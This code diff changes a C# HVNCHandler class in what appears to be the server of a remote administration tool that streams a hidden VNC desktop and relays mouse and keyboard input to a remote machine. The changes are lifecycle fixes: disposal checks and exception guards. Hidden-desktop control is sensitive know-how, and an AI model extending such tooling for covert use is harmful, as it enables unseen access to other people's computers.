@@ -106,6 +106,8 @@ namespace Pulsar.Server.Messages
         private int _frameBytesSamples = 0;
         private long _lastFrameBytes = 0;
 
+        private bool _disposed;
+
         public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);
         public double AverageFrameSizeBytes
         {
@@ -244,6 +246,11 @@ namespace Pulsar.Server.Messages
         /// <param name="useGPU">Whether to use GPU for screen capture.</param>
         public void BeginReceiveFrames(int quality, int display, bool useGPU)
         {
+            if (_disposed)
+            {
+                throw new ObjectDisposedException(nameof(HVNCHandler));
+            }
+
             lock (_syncLock)
             {
                 IsStarted = true;
@@ -275,6 +282,11 @@ namespace Pulsar.Server.Messages
         /// </summary>
         public void EndReceiveFrames()
         {
+            if (_disposed)
+            {
+                return;
+            }
+
             lock (_syncLock)
             {
                 IsStarted = false;
@@ -331,7 +343,7 @@ namespace Pulsar.Server.Messages
         /// <param name="lParam">The lParam value containing coordinates.</param>
         public void SendMouseEvent(uint message, int wParam, int lParam)
         {
-            if (!_enableMouseInput) return;
+            if (!_enableMouseInput || _disposed) return;
 
             lock (_syncLock)
             {
@@ -341,17 +353,17 @@ namespace Pulsar.Server.Messages
                 {
                     int x = lParam & 0xFFFF;
                     int y = (lParam >> 16) & 0xFFFF;
-                    
+
                     int remoteX = x * _codec.Resolution.Width / LocalResolution.Width;
                     int remoteY = y * _codec.Resolution.Height / LocalResolution.Height;
                     lParam = (remoteY << 16) | (remoteX & 0xFFFF);
                 }
 
-                _client.Send(new DoHVNCInput 
-                { 
-                    msg = message, 
-                    wParam = wParam, 
-                    lParam = lParam 
+                _client.Send(new DoHVNCInput
+                {
+                    msg = message,
+                    wParam = wParam,
+                    lParam = lParam
                 });
             }
         }
@@ -364,17 +376,17 @@ namespace Pulsar.Server.Messages
         /// <param name="lParam">The lParam value.</param>
         public void SendKeyboardEvent(uint message, int wParam, int lParam)
         {
-            if (!_enableKeyboardInput) return;
+            if (!_enableKeyboardInput || _disposed) return;
 
             lock (_syncLock)
             {
                 if (!IsStarted) return;
 
-                _client.Send(new DoHVNCInput 
-                { 
-                    msg = message, 
-                    wParam = wParam, 
-                    lParam = lParam 
+                _client.Send(new DoHVNCInput
+                {
+                    msg = message,
+                    wParam = wParam,
+                    lParam = lParam
                 });
             }
         }
@@ -390,27 +402,46 @@ namespace Pulsar.Server.Messages
 
         private async Task RequestMoreFramesAsync()
         {
-            if (!await _frameRequestSemaphore.WaitAsync(0))
+            bool acquired;
+            try
+            {
+                acquired = await _frameRequestSemaphore.WaitAsync(0).ConfigureAwait(false);
+            }
+            catch (ObjectDisposedException)
+            {
+                return;
+            }
+
+            if (!acquired)
                 return;
 
             try
             {
+                if (_disposed)
+                {
+                    return;
+                }
+
                 int targetFps = MaxFramesPerSecond;
-                
+
                 if (AdaptiveFrameRate && _pendingFrames > 2)
                 {
                     targetFps = Math.Max(15, targetFps / 2);
                     Debug.WriteLine($"Adaptive frame rate: reducing to {targetFps} FPS (pending frames: {_pendingFrames})");
                 }
-                
+
                 int minIntervalMs = 1000 / Math.Max(1, targetFps);
-                
+
                 var timeSinceLastRequest = DateTime.Now - _lastFrameRequest;
                 if (timeSinceLastRequest.TotalMilliseconds < minIntervalMs)
                 {
                     int delayMs = minIntervalMs - (int)timeSinceLastRequest.TotalMilliseconds;
                     Debug.WriteLine($"Frame rate limiting: waiting {delayMs}ms (target: {targetFps} FPS)");
-                    await Task.Delay(delayMs);
+                    await Task.Delay(delayMs).ConfigureAwait(false);
+                    if (_disposed)
+                    {
+                        return;
+                    }
                 }
 
                 int batchSize = AdaptiveFrameRate && _pendingFrames > 1 ? 1 : _defaultFrameRequestBatch;
@@ -419,19 +450,32 @@ namespace Pulsar.Server.Messages
                 Interlocked.Add(ref _pendingFrames, batchSize);
                 _lastFrameRequest = DateTime.Now;
 
-                _client.Send(new GetHVNCDesktop
+                if (!_disposed)
                 {
-                    CreateNew = false,
-                    Quality = _codec?.ImageQuality ?? 75,
-                    DisplayIndex = _codec?.Monitor ?? 0,
-                    Status = RemoteDesktopStatus.Continue,
-                    IsBufferedMode = true,
-                    FramesRequested = batchSize
-                });
+                    _client.Send(new GetHVNCDesktop
+                    {
+                        CreateNew = false,
+                        Quality = _codec?.ImageQuality ?? 75,
+                        DisplayIndex = _codec?.Monitor ?? 0,
+                        Status = RemoteDesktopStatus.Continue,
+                        IsBufferedMode = true,
+                        FramesRequested = batchSize
+                    });
+                }
+            }
+            catch (ObjectDisposedException)
+            {
+                // Ignore disposal races during shutdown.
             }
             finally
             {
-                _frameRequestSemaphore.Release();
+                try
+                {
+                    _frameRequestSemaphore.Release();
+                }
+                catch (ObjectDisposedException)
+                {
+                }
             }
         }
 
@@ -451,8 +495,15 @@ namespace Pulsar.Server.Messages
                 lock (_syncLock)
                 {
                     _codec?.Dispose();
-                    _frameRequestSemaphore?.Dispose();
+                    _disposed = true;
                     IsStarted = false;
+                }
+                try
+                {
+                    _frameRequestSemaphore.Dispose();
+                }
+                catch (ObjectDisposedException)
+                {
                 }
             }
         }
